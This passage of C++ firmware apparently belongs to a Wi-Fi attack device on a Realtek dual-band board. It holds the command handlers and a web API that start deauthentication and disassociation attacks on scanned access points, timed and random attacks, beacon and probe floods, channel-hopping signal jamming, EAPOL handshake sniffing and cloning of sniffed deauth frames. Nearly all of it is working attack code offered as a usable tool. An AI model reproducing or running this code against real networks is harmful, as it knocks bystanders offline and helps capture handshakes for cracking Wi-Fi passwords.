      printScanResults();
    }
    else {
      Serial.println("[INFO] No scan results available. Try 'scan' first.");
    }
    // 即使结果为空也向 BLE 推送 sync_begin/sync_end(n=0)，让重连后的 App 同步热点列表与已选目标
    blePushScanResults(true, true);
    return true;
  }
  else if (startsWithIgnoreCase(command, "attack_time ")) {
    String rest = command.substring(12);
    rest.trim();
    int sp = rest.indexOf(' ');
    String valStr = (sp > 0) ? rest.substring(0, sp) : rest;
    valStr.trim();
    String spec = (sp > 0) ? rest.substring(sp + 1) : "";
    spec.trim();
    long durationMs = 0;
    if (!parseStrictLong(valStr, durationMs) || durationMs <= 0) {
      return failCmd(errOut, "Invalid attack_time duration: " + valStr, true);
    }
    if (spec.length() > 0) {
      String errMsg;
      if (!applyTargetSpec(spec, false, errMsg)) {
        return failCmd(errOut, errMsg, true);
      }
    } else if (!hasSelectedTargetsSafe()) {
      // 决策 A：无目标时拒绝定时全攻
      return failCmd(errOut, "No targets selected. Select targets or use 'attack_time <ms> all'.", true);
    }
    stopConflictingModesBeforeAttack();
    if (!priorityStopPending) {
      emergencyStopRequested = false;
    }
    startTimedAttack((unsigned long)durationMs);
    blePushStatus();
    Serial.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
    return true;
  }
  else if (command.equalsIgnoreCase("disassoc") || startsWithIgnoreCase(command, "disassoc ")) {
    String spec = (command.length() > 8) ? command.substring(9) : "";
    spec.trim();
    if (spec.length() > 0) {
      String errMsg;
      if (!applyTargetSpec(spec, false, errMsg)) {
        return failCmd(errOut, errMsg, true);
      }
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      disassoc_enabled = true;
      blePushStatus();
      Serial.println("[INFO] Continuous Disassociation Attack started.");
      return true;
    } else if (disassoc_enabled) {
      disassoc_enabled = false;
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      blePushStatus();
      Serial.println("[INFO] Disassociation Attack stopped.");
      return true;
    } else {
      if (!hasSelectedTargetsSafe()) {
        // 决策 A：未选目标禁止无参 disassoc 回退全攻
        return failCmd(errOut, "No targets selected. Select targets or use 'disassoc all'.", true);
      }
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      disassoc_enabled = true;
      blePushStatus();
      Serial.println("[INFO] Continuous Disassociation Attack started.");
      return true;
    }
  }
  else if (command.equalsIgnoreCase("random_attack")) {
    std::vector<WiFiScanResult> snap = snapshotScanResults();
    if (!snap.empty()) {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      size_t idx = (size_t)random(0, snap.size());
      uint8_t randChannel = (uint8_t)snap[idx].channel;
      if (wifi_set_channel(randChannel) != RTW_SUCCESS) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(randChannel);
        Serial.println(") failed");
        bleSendLog("[WARN] Switch channel CH " + String(randChannel) + " failed");
        if (errOut) *errOut = "Failed to switch channel CH " + String(randChannel);
        blePushStatus();
        return false;
      } else {
        setCurrentChannelSafe(randChannel);
        for (unsigned long j = 0; j < num_send_frames; j++) {
          if (shouldAbortCycle()) break;
          uint16_t reason = deauth_reasons[j % num_deauth_reasons];
          wifi_tx_deauth_frame(snap[idx].bssid, dst_mac, reason);
          wifi_tx_disassoc_frame(snap[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
          delay(1);
        }
        restoreDefaultChannelIfNeeded(false);
        String msg = "[RANDOM ATTACK] => " + snap[idx].ssid + " (CH " + String(randChannel) + ")";
        Serial.println(msg);
        bleSendLog(msg);
        blePushStatus();
        return true;
      }
    } else {
      return failCmd(errOut, "No scan results. Run 'scan' first.", true);
    }
  }
  //==========================
  // Flood / Jam / Sniff-clone attacks (merged from upstream v1.0.3)
  //==========================
  else if (command.equalsIgnoreCase("beacon_flood") || command.equalsIgnoreCase("beacon flood")) {
    if (beacon_flood_enabled) {
      beacon_flood_enabled = false;
      Serial.println("[INFO] Beacon flood stopped.");
    } else {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      beacon_flood_enabled = true;
      beacon_flood_count = 0;
      Serial.println("[INFO] Beacon flood started.");
    }
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("probe_flood") || command.equalsIgnoreCase("probe flood")) {
    if (probe_flood_enabled) {
      probe_flood_enabled = false;
      Serial.println("[INFO] Probe flood stopped.");
    } else {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      probe_flood_enabled = true;
      probe_flood_count = 0;
      Serial.println("[INFO] Probe flood started.");
    }
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("signal_jam") || command.equalsIgnoreCase("signal jam")) {
    if (signal_jam_enabled) {
      signal_jam_enabled = false;
      restoreDefaultChannelIfNeeded(true);
      if (USE_LED) digitalWrite(LED_B, LOW);
      Serial.println("[INFO] Signal jam stopped.");
    } else {
      stopConflictingModesBeforeAttack();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      signal_jam_enabled = true;
      signal_jam_count = 0;
      signal_jam_ch_index = 0;
      Serial.println("[INFO] Signal jam started - rapid channel cycling + deauth.");
    }
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("deauth_sniff") || command.equalsIgnoreCase("deauth sniff")) {
    bool alreadyDeauthSniff = false;
    bool alreadySniffing = false;
    rtw_enter_critical(NULL, NULL);
    alreadyDeauthSniff = deauth_sniff_enabled;
    alreadySniffing = isSniffing;
    rtw_exit_critical(NULL, NULL);

    if (alreadyDeauthSniff) {
      stopSniffing();  // clears deauth_sniff_enabled, restores hopping, restores AP or STA
      Serial.println("[INFO] Deauth sniff stopped.");
      blePushStatus();
      return true;
    } else {
      stopAllActiveAttacks();
      if (!priorityStopPending) {
        emergencyStopRequested = false;
      }
      timedSniffEnabled = false;
      if (alreadySniffing) {
        wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
        rtw_enter_critical(NULL, NULL);
        isSniffing = false;
        currentMode = SNIFF_STOP;
        rtw_exit_critical(NULL, NULL);
      }
      // Close listening socket cleanly and use RTW_MODE_STA + promiscuous RX for cloned TX readiness
      prepareRadioForSniff(true);
      if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
        Serial.println("[ERROR] wifi_on(RTW_MODE_STA) failed for deauth_sniff.");
        if (apEnabled) {
          startSoftAP();
        } else {
          restoreBleCoex();
        }
        blePushStatus();
        if (errOut) *errOut = "wifi_on(RTW_MODE_STA) failed";
        return false;
      }
      restoreBleCoex();
      resetHopState();
      deauth_sniff_prev_hop = isHopping;
      isHopping = true;
      int chSnap = getCurrentChannelSafe();
      if (!setChannel(chSnap)) {
        Serial.println("[WARN] deauth_sniff failed to set initial channel " + String(chSnap) + "; hopChannel will retry.");
      }

      // 先置好全部状态位再注册回调，避免首波回调漏检或状态撕裂
      rtw_enter_critical(NULL, NULL);
      currentMode = SNIFF_DEAUTH;
      isSniffing = true;
      deauth_sniff_enabled = true;
      has_sniffed_deauth = false;
      sniffed_deauth_ch = currentChannel;
      rtw_exit_critical(NULL, NULL);

      if (wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1) != RTW_SUCCESS) {
        rtw_enter_critical(NULL, NULL);
        isSniffing = false;
        deauth_sniff_enabled = false;
        currentMode = SNIFF_STOP;
        isHopping = deauth_sniff_prev_hop;
        deauth_sniff_prev_hop = false;
        rtw_exit_critical(NULL, NULL);
        Serial.println("[ERROR] wifi_set_promisc failed for deauth_sniff.");
        restoreRadioAfterSniff();
        blePushStatus();
        if (errOut) *errOut = "wifi_set_promisc failed";
        return false;
      } else {
        Serial.println("[INFO] Deauth sniff started - auto-hopping 2.4G/5G to clone deauth frames.");
        bleSendLog("[INFO] Deauth 克隆嗅探已启动 (自动双频跳频监听)");
        blePushStatus();
        return true;
      }
    }
  }
  else if (startsWithIgnoreCase(command, "single_ap ") ||
           startsWithIgnoreCase(command, "single ap ") ||
           command.equalsIgnoreCase("single_ap") ||
           command.equalsIgnoreCase("single ap")) {
    std::vector<WiFiScanResult> snap = snapshotScanResults();
    if (snap.empty()) {
      return failCmd(errOut, "No scan results. Run 'scan' first.");
    } else if (command.length() <= 10) {
      return failCmd(errOut, "Missing AP index. Usage: single_ap <index>");
    } else {
      String idxStr = command.substring(10);
      idxStr.trim();
      long idx = -1;
      if (!parseStrictLong(idxStr, idx) || idx < 0 || idx >= (long)snap.size()) {
        return failCmd(errOut, "Invalid single_ap index: " + idxStr);
      } else {
        stopConflictingModesBeforeAttack();
        if (!priorityStopPending) {
          emergencyStopRequested = false;
        }
        if (wifi_set_channel(snap[(size_t)idx].channel) != RTW_SUCCESS) {
          Serial.print("[WARN] wifi_set_channel(");
          Serial.print(snap[(size_t)idx].channel);
          Serial.println(") failed");
          bleSendLog("[WARN] Switch CH " + String(snap[(size_t)idx].channel) + " failed");
          if (errOut) *errOut = "Failed to switch channel";
          blePushStatus();
          return false;
        } else {
          setCurrentChannelSafe((int)snap[(size_t)idx].channel);
          for (unsigned long j = 0; j < num_send_frames; j++) {
            if (shouldAbortCycle()) break;
            wifi_tx_deauth_frame(snap[(size_t)idx].bssid, dst_mac, deauth_reasons[j % num_deauth_reasons]);
            wifi_tx_disassoc_frame(snap[(size_t)idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
            delay(1);
          }
          restoreDefaultChannelIfNeeded(false);
          String msg = "[SINGLE AP] Attacked " + snap[(size_t)idx].ssid + " on CH " + String(snap[(size_t)idx].channel);
          Serial.println(msg);
          bleSendLog(msg);
          blePushStatus();
          return true;
        }
      }
    }
  }
  else if (command.equalsIgnoreCase("tx_stats")) {
    String statsMsg = "TX Stats: " + String(tx_success_count) + " OK / " + String(tx_fail_count) + " FAIL";
    Serial.println(statsMsg);
    bleSendLog(statsMsg);
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("reset_txstats")) {
    tx_success_count = 0;
    tx_fail_count = 0;
    seq_num_counter = 1;
    blePushStatus();
    Serial.println("[TX STATS] Reset.");
    return true;
  }
  else if (command.equalsIgnoreCase("start sniff")) {
    startMonitorSniff(SNIFF_ALL);
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("hop on")) {
    resetHopState();
    isHopping = true;
    blePushStatus();
    return true;
  }
  else if (command.equalsIgnoreCase("hop off")) {
    isHopping = false;
    blePushStatus();
    return true;
  }
  else if (startsWithIgnoreCase(command, "set ch ")) {
    String chStr = command.substring(7);
    chStr.trim();
    long newChannelLong = -1;
    bool validChannel = false;
    if (parseStrictLong(chStr, newChannelLong)) {
      int newChannel = (int)newChannelLong;
      for (int ch : CHANNELS_2GHZ) { if (ch == newChannel) validChannel = true; }
      for (int ch : CHANNELS_5GHZ) { if (ch == newChannel) validChannel = true; }
    }
    if (validChannel) {
      bool sniffingNow = false;
      rtw_enter_critical(NULL, NULL);
      sniffingNow = isSniffing;
      rtw_exit_critical(NULL, NULL);
      if ((softApActive || apEnabled) && !sniffingNow) {
        if (errOut) *errOut = "SoftAP active on CH 1; start sniff or run 'ap off' before locking channel.";
        Serial.println("[WARN] SoftAP active on CH 1; start sniff or run 'ap off' before locking channel.");
        bleSendLog("[WARN] 当前热点开启中，请先开始抓包或关闭热点后再锁频");
        return false;
      } else {
        isHopping = false;
        useCustomChannels = false;
        if (!setChannel((int)newChannelLong)) {
          bleSendLog("[WARN] 切换信道 CH " + String((int)newChannelLong) + " 失败");
          if (errOut) *errOut = "Failed to switch channel";
          blePushStatus();
          return false;
        }
        blePushStatus();
        return true;
      }
    } else {
      return failCmd(errOut, "Invalid channel: " + chStr);
    }
  }
  else if (command.equalsIgnoreCase("sniff beacon")) { startMonitorSniff(SNIFF_BEACON); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff probe")) { startMonitorSniff(SNIFF_PROBE); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff deauth")) { startMonitorSniff(SNIFF_DEAUTH); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff eapol")) { startMonitorSniff(SNIFF_EAPOL); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff pwnagotchi")) { startMonitorSniff(SNIFF_PWNAGOTCHI); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("sniff all")) { startMonitorSniff(SNIFF_ALL); blePushStatus(); return true; }
  else if (command.equalsIgnoreCase("stop sniff")) { stopSniffing(); blePushStatus(); return true; }
  else if (startsWithIgnoreCase(command, "sniff_time ")) {
    unsigned long dur = 0;
    SniffMode mode = SNIFF_ALL;
    String errMsg;
    if (!parseSniffTimeCmd(command, dur, mode, errMsg)) {
      return failCmd(errOut, errMsg);
    }
    startMonitorSniff(mode, true, dur);
    blePushStatus();
    Serial.println("[INFO] Timed sniff started for " + String(dur) + " ms.");
    return true;
  }
  else if (command.equalsIgnoreCase("clear_logs")) {
    rtw_enter_critical(NULL, NULL);
    webLogHead = 0;
    webLogCount = 0;
    logHead = 0;
    logTail = 0;
    droppedLogCount = 0;
    rtw_exit_critical(NULL, NULL);
    Serial.println("[INFO] Sniff logs cleared.");
    bleSendLog("[INFO] Sniff logs cleared.");
    return true;
  }
  else if (startsWithIgnoreCase(command, "set ")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if (space_index != -1) {
      String key = setting.substring(0, space_index);
      String rawValue = setting.substring(space_index + 1);
      rawValue.trim();

      String errMsg = "";
      if (key.equalsIgnoreCase("cycle_delay") ||
          key.equalsIgnoreCase("scan_time") ||
          key.equalsIgnoreCase("num_frames") ||
          key.equalsIgnoreCase("start_channel") ||
          key.equalsIgnoreCase("scan_cycles") ||
          key.equalsIgnoreCase("led") ||
          key.equalsIgnoreCase("ap_ssid") ||
          key.equalsIgnoreCase("ap_pass") ||
          key.equalsIgnoreCase("ble_name")) {
        if (!validateConfigSetting(key, rawValue, errMsg)) {
          blePushInfo();
          return failCmd(errOut, errMsg);
        } else {
          bool apChanged = false;
          applyConfigSetting(key, rawValue, apChanged);
          saveConfigToFlash();
          if (apChanged) scheduleApRestart();
          blePushInfo();
          return true;
        }
      }
      else if (key.equalsIgnoreCase("target")) {
        if (!applyTargetSpec(rawValue, rawValue.length() == 0, errMsg)) {
          blePushStatus();
          return failCmd(errOut, errMsg);
        }
        blePushStatus();
        return true;
      }
      else {
        return failCmd(errOut, "Unknown setting key: " + key);
      }
    }
    else if (setting.equalsIgnoreCase("target")) {
      String errMsg;
      applyTargetSpec("", true, errMsg);
      blePushStatus();
      return true;
    } else {
      return failCmd(errOut, "Invalid set syntax: " + setting);
    }
  }
  else if (command.equalsIgnoreCase("reset_config")) {
    bool apChanged = (strcmp(ap_ssid, DEFAULT_WIFI_SSID) != 0 || strcmp(ap_pass, DEFAULT_WIFI_PASS) != 0);
    strcpy(ap_ssid, DEFAULT_WIFI_SSID);
    strcpy(ap_pass, DEFAULT_WIFI_PASS);
    updateBleName(DEFAULT_BLE_NAME);
    cycle_delay = 2000;
    scan_time = 5000;
    num_send_frames = 3;
    start_channel = 1;
    scan_between_cycles = false;
    USE_LED = true;
    saveConfigToFlash();
    blePushInfo();
    if (apChanged) scheduleApRestart();
    Serial.println("[CFG] Restored factory default configuration.");
    return true;
  }
  else if (command.equalsIgnoreCase("info")) {
    Serial.println("[INFO] SSID=" + String(ap_ssid) + " BLE=" + String(ble_name) + " cycle_delay=" + String(cycle_delay) + " scan_time=" + String(scan_time) + " frames=" + String(num_send_frames));
    blePushInfo();
    return true;
  }
  else if (command.equalsIgnoreCase("help")) {
    Serial.println("Commands: scan, results, start deauther <i,j|all>, stop, disassoc <i,j|all>, random_attack, attack_time <ms> <i,j|all>, clear_logs");
    Serial.println("Sniffer: start sniff, sniff beacon/probe/deauth/eapol/pwnagotchi/all, sniff_time <ms> <mode>, stop sniff, hop on/off");
    Serial.println("Config: set ap_ssid/ap_pass/ble_name/cycle_delay/scan_time/num_frames/start_channel/scan_cycles/led/target <val>, reset_config");
    Serial.println("Web: connect to WiFi '" + String(ap_ssid) + "' and open 192.168.1.1 in browser");
    bleSendLog("Cmds: scan | results | start deauther <i,j|all> | disassoc <i,j|all> | stop | clear_logs | tx_stats");
    return true;
  }
  else {
    return failCmd(errOut, "Unknown command: " + command);
  }
}

void handleCommand(String command) {
  executeCommand(command, nullptr, false);
}

//==========================================================
// Attack Functions
//==========================================================
void targetAttack() {
  std::vector<WiFiScanResult> targets;
  bool isTargetMode = false;
  if (lockScanMutex()) {
    isTargetMode = target_mode;
    if (isTargetMode) {
      targets = target_aps;
    }
    unlockScanMutex();
  }
  if (isTargetMode && !targets.empty() && attack_enabled) {
    if (USE_LED) digitalWrite(LED_B, HIGH);
    bool aborted = false;
    for (size_t i = 0; i < targets.size(); i++) {
      if (shouldAbortCycle() || !attack_enabled) {
        aborted = true;
        break;
      }
      if (wifi_set_channel(targets[i].channel) != RTW_SUCCESS) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(targets[i].channel);
        Serial.println(") failed");
        continue;
      }
      setCurrentChannelSafe((int)targets[i].channel);
      for (unsigned long j = 0; j < num_send_frames; j++) {
        if (shouldAbortCycle() || !attack_enabled) {
          aborted = true;
          break;
        }
        uint16_t reason = deauth_reasons[j % num_deauth_reasons];
        // 仅发 AP -> Broadcast 的有效帧；src==dst(BSSID->BSSID) 会被 AP 硬件当作回环丢弃，
        // 徒耗 50% 空口时间
        wifi_tx_deauth_frame(targets[i].bssid, dst_mac, reason);
        wifi_tx_disassoc_frame(targets[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
        delay(1);
      }
      if (aborted) break;
    }
    // 仅在 WebUI SoftAP 开启时回切至热点信道以维持网页连接
    restoreDefaultChannelIfNeeded(false);
    if (USE_LED) digitalWrite(LED_B, LOW);
  }
}

//==========================================================
// Web Client Handler
//==========================================================
void handleWebClient() {
  bool sniffingNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffingNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (!apEnabled || sniffingNow) return;  // ap off 或抓包切出 SoftAP 期间不轮询已关闭的 WebServer
  WiFiClient client = webServer.available();
  if (!client || !client.connected()) return;

  const size_t MAX_HTTP_REQ_LEN = 4096;
  const unsigned long IDLE_FIRST_BYTE_MS = 250;
  const unsigned long HDR_READ_TIMEOUT_MS = 1000;
  const unsigned long BODY_READ_TIMEOUT_MS = 1200;

  String request;
  request.reserve(512);
  unsigned long startMs = millis();

  // 差值计时避免 millis() 回绕，并缩短半开/空闲连接阻塞
  while (client.available() == 0 && client.connected() && (millis() - startMs < IDLE_FIRST_BYTE_MS)) {
    delay(1);
  }
  if (client.available() == 0) {
    client.stop();
    return;
  }

  int headerEnd = -1;
  int sepLen = 4;
  bool tooLarge = false;
  while (client.connected() && (millis() - startMs < HDR_READ_TIMEOUT_MS)) {
    while (client.available()) {
      char c = (char)client.read();
      request += c;
      if (request.length() > MAX_HTTP_REQ_LEN) {
        tooLarge = true;
        break;
      }
      int pos = request.indexOf("\r\n\r\n");
      if (pos >= 0) {
        headerEnd = pos;
        sepLen = 4;
        break;
      }
      pos = request.indexOf("\n\n");
      if (pos >= 0) {
        headerEnd = pos;
        sepLen = 2;
        break;
      }
    }
    if (headerEnd >= 0 || tooLarge) break;
    delay(1);
  }

  if (tooLarge) {
    String errJson = "{\"status\":\"error\",\"message\":\"Request entity too large\"}";
    sendHttpResponse(client, 413, "application/json", errJson.c_str(), errJson.length());
    delay(10);
    client.stop();
    return;
  }

  if (request.length() == 0 || headerEnd < 0) {
    String errJson = "{\"status\":\"error\",\"message\":\"Malformed or timed-out HTTP request\"}";
    sendHttpResponse(client, 400, "application/json", errJson.c_str(), errJson.length());
    delay(10);
    client.stop();
    return;
  }

  String headers = request.substring(0, (unsigned int)headerEnd);
  String method = parseMethod(headers);
  String fullPath = parsePath(headers);
  if (method.length() == 0) {
    String errJson = "{\"status\":\"error\",\"message\":\"Invalid HTTP request line\"}";
    sendHttpResponse(client, 400, "application/json", errJson.c_str(), errJson.length());
    delay(10);
    client.stop();
    return;
  }

  long contentLength = 0;
  int clStatus = parseContentLengthHeader(headers, contentLength);
  if (clStatus < 0) {
    String errJson = "{\"status\":\"error\",\"message\":\"Invalid Content-Length header\"}";
    sendHttpResponse(client, 400, "application/json", errJson.c_str(), errJson.length());
    delay(10);
    client.stop();
    return;
  }
  if ((size_t)contentLength > MAX_HTTP_REQ_LEN ||
      ((size_t)headerEnd + (size_t)sepLen + (size_t)contentLength) > MAX_HTTP_REQ_LEN) {
    String errJson = "{\"status\":\"error\",\"message\":\"Payload exceeds limit\"}";
    sendHttpResponse(client, 413, "application/json", errJson.c_str(), errJson.length());
    delay(10);
    client.stop();
    return;
  }

  size_t bodyStart = (size_t)headerEnd + (size_t)sepLen;
  if (contentLength > 0) {
    unsigned long bodyWaitStart = millis();
    while ((request.length() - bodyStart) < (size_t)contentLength &&
           client.connected() &&
           (millis() - bodyWaitStart < BODY_READ_TIMEOUT_MS)) {
      if (client.available()) {
        while (client.available() && (request.length() - bodyStart) < (size_t)contentLength) {
          request += (char)client.read();
        }
      } else {
        delay(1);
      }
    }
    if ((request.length() - bodyStart) < (size_t)contentLength) {
      String errJson = "{\"status\":\"error\",\"message\":\"Incomplete request body\"}";
      sendHttpResponse(client, 408, "application/json", errJson.c_str(), errJson.length());
      delay(10);
      client.stop();
      return;
    }
  }

  String body = (contentLength > 0)
    ? request.substring((unsigned int)bodyStart, (unsigned int)(bodyStart + (size_t)contentLength))
    : ((request.length() > bodyStart) ? request.substring((unsigned int)bodyStart) : "");

  int qIdx = fullPath.indexOf('?');
  String path = (qIdx >= 0) ? fullPath.substring(0, qIdx) : fullPath;
  String queryStr = (qIdx >= 0) ? fullPath.substring(qIdx + 1) : "";

  Serial.println("[WEB] " + method + " " + fullPath);

  if (USE_LED) digitalWrite(LED_G, HIGH);
  bool clientClosed = false;

  if (path == "/api/scan") {
    if (method == "GET") {
      String json = getScanResultsJSON();
      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
    } else if (method == "POST") {
      String errMsg;
      if (executeCommand("scan", &errMsg, true)) {
        String json = "{\"status\":\"scan_complete\",\"count\":" + String(getScanCountSafe()) + "}";
        sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
      } else {
        String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg.length() ? errMsg : String("Wi-Fi scan failed")) + "\"}";
        sendHttpResponse(client, 500, "application/json", json.c_str(), json.length());
      }
    } else {
      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
    }
  }
  else if (path == "/api/status") {
    if (method == "GET") {
      String json = getStatusJSON();
      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
    } else {
      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
    }
  }
  else if (path == "/api/info") {
    if (method == "GET") {
      String json = getInfoJSON();
      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
    } else {
      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
    }
  }
  else if (path == "/api/logs") {
    if (method == "GET") {
      String json = getLogsJSON();
      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
    } else {
      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
    }
  }
  else if (path == "/api/logs/clear") {
    if (method == "POST") {
      String errMsg;
      executeCommand("clear_logs", &errMsg, true);
      String json = "{\"status\":\"ok\"}";
      sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
    } else {
      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
    }
  }
  else if (path == "/api/command") {
    if (method != "POST") {
      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
    } else {
      String cmd = hasFormKey(body, "cmd") ? getPostValue(body, "cmd") : getQueryParam(fullPath, "cmd");
      cmd.trim();
      if (cmd.length() == 0) {
        String json = "{\"status\":\"error\",\"message\":\"No command provided\"}";
        sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
      } else if (cmd.equalsIgnoreCase("ap off")) {
        // 决策 B：禁止通过 WebUI/HTTP 永久关闭 SoftAP
        String json = "{\"status\":\"error\",\"message\":\"'ap off' is disabled over WebUI/HTTP; use BLE or Serial.\"}";
        sendHttpResponse(client, 403, "application/json", json.c_str(), json.length());
      } else {
        if (isStopCmdCstr(cmd.c_str())) {
          rtw_enter_critical(NULL, NULL);
          emergencyStopRequested = true;
          priorityStopPending = true;
          rtw_exit_critical(NULL, NULL);
        }
        bool entersPromisc = (cmd.equalsIgnoreCase("start sniff") ||
                              cmd.equalsIgnoreCase("sniff all") ||
                              cmd.equalsIgnoreCase("sniff beacon") ||
                              cmd.equalsIgnoreCase("sniff probe") ||
                              cmd.equalsIgnoreCase("sniff deauth") ||
                              cmd.equalsIgnoreCase("sniff eapol") ||
                              cmd.equalsIgnoreCase("sniff pwnagotchi") ||
                              startsWithIgnoreCase(cmd, "sniff_time ") ||
                              cmd.equalsIgnoreCase("deauth_sniff") ||
                              cmd.equalsIgnoreCase("deauth sniff"));
        if (entersPromisc) {
          String errMsg;
          bool preValid = true;
          if (startsWithIgnoreCase(cmd, "sniff_time ")) {
            unsigned long dummyDur = 0;
            SniffMode dummyMode = SNIFF_ALL;
            preValid = parseSniffTimeCmd(cmd, dummyDur, dummyMode, errMsg);
          }
          if (!preValid) {
            String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg) + "\"}";
            sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
          } else {
            // 先完整发送 HTTP 200 并等待刷出与单次关闭连接，再切入混杂/STA 模式
            String json = "{\"status\":\"ok\",\"command\":\"" + jsonEscape(cmd) + "\"}";
            sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
            delay(50);
            client.stop();
            clientClosed = true;
            executeCommand(cmd, &errMsg, true);
            // If no BLE client is connected, protect pure-WebUI users with an automatic 15s recovery timer
            bool sniffStarted = false;
            rtw_enter_critical(NULL, NULL);
            sniffStarted = isSniffing;
            rtw_exit_critical(NULL, NULL);
            if (sniffStarted && !BLE.connected(activeConnId) && !timedSniffEnabled) {
              timedSniffEnabled = true;
              sniffStartTime = millis();
              sniffDuration = 15000;
            }
          }
        } else {
          String errMsg;
          if (executeCommand(cmd, &errMsg, true)) {
            String json = "{\"status\":\"ok\",\"command\":\"" + jsonEscape(cmd) + "\"}";
            sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
          } else {
            int statusCode = (cmd.equalsIgnoreCase("scan")) ? 500 : 400;
            String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg.length() ? errMsg : String("Command failed")) + "\"}";
            sendHttpResponse(client, statusCode, "application/json", json.c_str(), json.length());
          }
        }
      }
    }
  }
  else if (path == "/api/target") {
    if (method != "POST") {
      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
    } else {
      bool hasIndices = hasFormKey(body, "indices") || hasFormKey(queryStr, "indices");
      if (!hasIndices) {
        String json = "{\"status\":\"error\",\"message\":\"Missing 'indices' parameter\"}";
        sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
      } else {
        String indices = hasFormKey(body, "indices") ? getPostValue(body, "indices") : getQueryParam(fullPath, "indices");
        indices.trim();
        String errMsg;
        bool ok = applyTargetSpec(indices, true, errMsg);
        size_t scanCount = 0;
        size_t targetCount = 0;
        bool targetModeSnap = false;
        getScanAndTargetCountsSafe(scanCount, targetCount, targetModeSnap);
        if (!ok) {
          String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg) +
                        "\",\"targets\":" + String(targetCount) +
                        ",\"target_mode\":" + String(targetModeSnap ? "true" : "false") + "}";
          sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
        } else {
          blePushStatus();
          String json = "{\"status\":\"ok\",\"targets\":" + String(targetCount) +
                        ",\"target_mode\":" + String(targetModeSnap ? "true" : "false") + "}";
          sendHttpResponse(client, 200, "application/json", json.c_str(), json.length());
        }
      }
    }
  }
  else if (path == "/api/config") {
    if (method != "POST") {
      String json = "{\"status\":\"error\",\"message\":\"Method Not Allowed\"}";
      sendHttpResponse(client, 405, "application/json", json.c_str(), json.length());
    } else {
      static const char* const cfgKeys[] = {
        "ap_ssid", "ap_pass", "ble_name", "cycle_delay", "scan_time",
        "num_frames", "start_channel", "led", "scan_cycles"
      };
      const size_t numCfgKeys = sizeof(cfgKeys) / sizeof(cfgKeys[0]);
      String errMsg = "";
      bool valid = true;
      bool hasAnyKey = false;
      for (size_t k = 0; k < numCfgKeys; k++) {
        String key = cfgKeys[k];
        if (!hasFormKey(body, key)) continue;
        hasAnyKey = true;
        String val = getPostValue(body, key);
        val.trim();
        if (!validateConfigSetting(key, val, errMsg)) {
          valid = false;
          break;
        }
      }
      if (!hasAnyKey) {
        String json = "{\"status\":\"error\",\"message\":\"No valid configuration parameters provided\"}";
        sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
      } else if (!valid) {
        String json = "{\"status\":\"error\",\"message\":\"" + jsonEscape(errMsg) + "\"}";
        sendHttpResponse(client, 400, "application/json", json.c_str(), json.length());
      } else {
        String result = "";
        bool apChanged = false;
        bool anyUpdated = false;
